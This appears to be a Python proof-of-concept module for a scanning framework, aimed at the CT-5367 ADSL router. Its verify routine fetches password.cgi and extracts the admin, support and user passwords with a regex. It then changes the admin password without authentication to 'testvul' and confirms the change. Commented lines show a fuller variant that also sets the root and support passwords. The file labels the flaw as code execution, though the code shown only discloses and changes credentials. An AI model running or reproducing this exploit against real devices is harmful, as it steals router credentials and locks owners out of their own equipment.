# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse

class Vuln(ABVuln):
    vuln_id = 'ADSL_Router_0001' # 平台漏洞编号，留空
    name = '康全电讯 ADSL Router 远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2011-03-04'  # 漏洞公布时间
    desc = '''
        康全电讯 ADSL Router CT-5367 C01_R12 - 函数参数过滤不严谨导致 Remote Code Execution.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/16275/, http://www.exploit-db.com/exploits/18101/'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '康全电讯 ADSL Router'  # 漏洞应用名称
    product_version = 'CT-5367 C01_R12'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a5654a28-e48f-4388-8948-4ed6fe619408'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payload = self.target + '/password.cgi'
            code, head, res, err, _ = hh.http(payload)
            if code == 200:
                m = re.search(r"pwdAdmin = '[\S]*';\s*pwdSupport = '[\S]*';\s*pwdUser = '[\S]*';", res)
                if m:
                    #security_hole('find administrator password on telnet: ' + m.group(0));
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            payload_change_pass = '/password.cgi?sysPassword=testvul'
            payload = self.target + payload_change_pass
            code, head, res, err, _  = hh.http(payload)
            if code == 200 and "pwdAdmin = 'testvul'" in res:
                #security_hole('password change vulnerable: '+ arg + 'password.cgi?sysPassword=rootpass&sptPassword=supportpass')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
